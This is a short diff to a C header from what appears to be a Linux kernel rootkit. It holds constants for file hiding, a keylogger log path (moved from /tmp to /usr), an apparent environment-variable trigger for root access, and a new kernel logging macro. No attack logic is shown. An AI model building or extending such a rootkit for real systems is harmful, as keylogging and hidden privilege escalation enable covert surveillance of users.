@@ -14,10 +14,13 @@
 
 #define PROCFILE_NAME "rootkit"
 #define HIDE_PREFIX "rk_file_"
-#define KEYLOG_FILE "/tmp/rk_file_keylog"
+#define KEYLOG_FILE "/usr/rk_file_keylog"
 
 #define ENV_VAR "root"
 #define ENV_PASS "yes"
+
+#define FM_INFO(fmt, ...) \
+    printk(KERN_INFO "[%s.%s]: " fmt, THIS_MODULE->name, __func__, ##__VA_ARGS__)
 
 #define MIN(a, b)               \
     ({                          \
